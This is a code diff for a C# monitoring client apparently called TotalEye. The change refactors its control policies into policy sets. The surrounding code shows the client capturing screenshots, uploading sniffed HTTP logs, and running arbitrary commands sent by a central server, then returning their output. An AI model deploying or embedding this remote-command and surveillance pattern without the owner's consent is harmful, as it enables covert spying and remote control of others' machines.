@@ -79,19 +79,19 @@ namespace VowAI.TotalEye.Client
         private async void Poll(HttpClient client)
         {
             ClientInfoRequest? request;
-            ClientControlPolicy? policy;
+            ClientControlPolicySet? policySet;
 
             if ((request = await Ask(client)) == null)
             {
                 throw new InvalidDataException("Fail obtaining request information from centre.");
             }
-            else if ((policy = await Reply(client, request)) == null)
+            else if ((policySet = await Reply(client, request)) == null)
             {
                 throw new InvalidDataException("Fail obtaining client control policy from centre.");
             }
             else
             {
-                ApplyPolicy(policy);
+                ApplyPolicy(policySet);
             }
         }
 
@@ -107,7 +107,7 @@ namespace VowAI.TotalEye.Client
             return await response.Content.ReadFromJsonAsync<ClientInfoRequest>();
         }
 
-        private async Task<ClientControlPolicy?> Reply(HttpClient client, ClientInfoRequest request)
+        private async Task<ClientControlPolicySet?> Reply(HttpClient client, ClientInfoRequest request)
         {
             switch (request.Name.ToLower())
             {
@@ -129,41 +129,47 @@ namespace VowAI.TotalEye.Client
             }
         }
 
-        private async Task<ClientControlPolicy?> UploadImageFromPath(HttpClient client, ClientInfoRequest request)
+        private async Task<ClientControlPolicySet?> UploadImageFromPath(HttpClient client, ClientInfoRequest request)
         {
             string location = LocalComputer.RunCommand("VowAI.TotalEye.CatchScreen.exe /Destination:Screenshot.jpg");
 
             return await UploadFile(client, request, new FileInfo(location).Name, File.ReadAllBytes(location));
         }
 
-        private async Task<ClientControlPolicy?> UploadHttpLogs(HttpClient client, ClientInfoRequest request)
+        private async Task<ClientControlPolicySet?> UploadHttpLogs(HttpClient client, ClientInfoRequest request)
         {
             return await UploadText(client, request, JsonSerializer.Serialize(_httpSniffer.ReadHttpLogs()));
         }
 
-        private async Task<ClientControlPolicy?> UploadCommandOutput(HttpClient client, ClientInfoRequest request)
+        private async Task<ClientControlPolicySet?> UploadCommandOutput(HttpClient client, ClientInfoRequest request)
         {
             return await UploadText(client, request, LocalComputer.RunCommand(request.Description));
         }
 
-        private void ApplyPolicy(ClientControlPolicy policy)
+        private void ApplyPolicy(ClientControlPolicySet policySet)
         {
-            switch (policy.Tag.ToLower())
+            if (policySet.Policies != null)
             {
-                case "http_connect":
-                case "http_request":
-                case "http_response":
-                case "local_computer":
+                foreach (var policy in policySet.Policies)
+                {
+                    switch (policy.Tag.ToLower())
+                    {
+                        case "http_connect":
+                        case "http_request":
+                        case "http_response":
+                        case "local_computer":
 
-                    (_policyProvider as ClientControlPolicyProvider)?.SetPolicy(policy);
-                    break;
+                            (_policyProvider as ClientControlPolicyProvider)?.SetPolicy(policy);
+                            break;
 
-                case "" /* No further action. */:
-                    break;
+                        case "" /* No further action. */:
+                            break;
 
-                default:
+                        default:
 
-                    throw new ArgumentException($"Unknown policy tag '{policy.Tag}'.");
+                            throw new ArgumentException($"Unknown policy tag '{policy.Tag}'.");
+                    }
+                }
             }
         }
 
@@ -196,7 +202,7 @@ namespace VowAI.TotalEye.Client
             }
         }
 
-        private async Task<ClientControlPolicy?> UploadFile(HttpClient client, ClientInfoRequest request, string name, byte[] bytes)
+        private async Task<ClientControlPolicySet?> UploadFile(HttpClient client, ClientInfoRequest request, string name, byte[] bytes)
         {
             MultipartFormDataContent content = new MultipartFormDataContent();
             StringContent tokenContent = new StringContent(request.Token);
@@ -208,10 +214,10 @@ namespace VowAI.TotalEye.Client
             content.Add(imageContent, "payload", name);
 
             HttpResponseMessage response = await client.PostAsync(request.ReplyUrl, content);
-            return await response.Content.ReadFromJsonAsync<ClientControlPolicy>();
+            return await response.Content.ReadFromJsonAsync<ClientControlPolicySet>();
         }
 
-        private async Task<ClientControlPolicy?> UploadText(HttpClient client, ClientInfoRequest request, string text)
+        private async Task<ClientControlPolicySet?> UploadText(HttpClient client, ClientInfoRequest request, string text)
         {
             MultipartFormDataContent content = new MultipartFormDataContent();
             StringContent token = new StringContent(request.Token, Encoding.UTF8);
@@ -221,7 +227,7 @@ namespace VowAI.TotalEye.Client
             content.Add(uploadContent, "payload");
 
             HttpResponseMessage response = await client.PostAsync(request.ReplyUrl, content);
-            return await response.Content.ReadFromJsonAsync<ClientControlPolicy>();
+            return await response.Content.ReadFromJsonAsync<ClientControlPolicySet>();
         }
 
         #endregion
